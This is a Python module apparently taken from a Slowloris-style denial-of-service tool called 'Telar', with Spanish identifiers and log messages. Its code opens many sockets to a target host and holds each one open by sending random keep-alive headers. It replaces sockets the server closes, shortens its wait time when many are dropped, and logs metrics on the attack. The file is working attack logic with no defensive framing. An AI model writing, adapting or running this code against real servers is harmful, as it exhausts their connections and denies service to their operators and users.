# telar/logica.py
import logging
import time
import socket
import random
from configuracion import args
from red import iniciar_socket
from metricas import iniciar_log_metricas, registrar_iteracion, finalizar_log

lista_sockets = []
ajustes_dinamicos_activados = True

def iteracion_telar():
    logging.info("Enviando encabezados keep-alive...")
    logging.info("Cantidad de sockets: %s", len(lista_sockets))

    cerrados = 0
    inicio_iteracion = time.time()

    for s in list(lista_sockets):
        try:
            cantidad_headers = random.randint(3, 6)
            for _ in range(cantidad_headers):
                nombre = f"X-{random.choice(['a','b','c','d','e','keep','ping'])}-{random.randint(1, 100)}"
                valor = str(random.randint(1000, 999999))
                s.enviar_encabezado(nombre, valor)
        except socket.error as e:
            mensaje = str(e).lower()
            if "timed out" in mensaje or "reset" in mensaje or "broken pipe" in mensaje:
                logging.debug("⚠️ Socket cerrado por el servidor: %s", mensaje)
            else:
                logging.debug("⚠️ Socket cerrado inesperadamente: %s", mensaje)
            lista_sockets.remove(s)
            cerrados += 1

    faltan = args.sockets - len(lista_sockets)
    nuevos = 0
    if faltan > 0:
        logging.info("Creando %s nuevos sockets...", faltan)
        for _ in range(faltan):
            try:
                s = iniciar_socket(args.host)
                lista_sockets.append(s)
                nuevos += 1
            except socket.error as e:
                logging.debug("Fallo al crear nuevo socket: %s", e)
                break

    if ajustes_dinamicos_activados and cerrados > 0:
        porcentaje_cerrados = (cerrados / (cerrados + len(lista_sockets))) * 100
        if porcentaje_cerrados > 30 and args.tiempo_espera > 3:
            args.tiempo_espera -= 1
            logging.warning("⚠️ Muchos sockets cerrados (%d%%). Reduciendo tiempo de espera a %ds.",
                            int(porcentaje_cerrados), args.tiempo_espera)

    duracion_ms = (time.time() - inicio_iteracion) * 1000
    registrar_iteracion(len(lista_sockets), cerrados, nuevos, duracion_ms, args.tiempo_espera)
    logging.debug("🕒 Sleeptime actual: %ds", args.tiempo_espera)

def ejecutar_telar():
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )

    iniciar_log_metricas()
    ip = args.host
    logging.info("Atacando %s con %s sockets.", ip, args.sockets)

    logging.info("Creando sockets iniciales...")
    for _ in range(args.sockets):
        try:
            s = iniciar_socket(ip)
            lista_sockets.append(s)
        except socket.error as e:
            logging.debug("Error al crear socket inicial: %s", e)
            break

    try:
        while True:
            iteracion_telar()
            time.sleep(args.tiempo_espera)
    except (KeyboardInterrupt, SystemExit):
        logging.info("Deteniendo Telar por interrupción del usuario.")
        resumen = finalizar_log()
        print("\n\n📊 RESUMEN FINAL")
        print(resumen)
    except Exception as e:
        logging.debug("Error en ejecución Telar: %s", e)
        resumen = finalizar_log()
        print("\n\n📊 RESUMEN FINAL")
        print(resumen)
    else:
        resumen = finalizar_log()
        print("\n\n📊 RESUMEN FINAL")
        print(resumen)
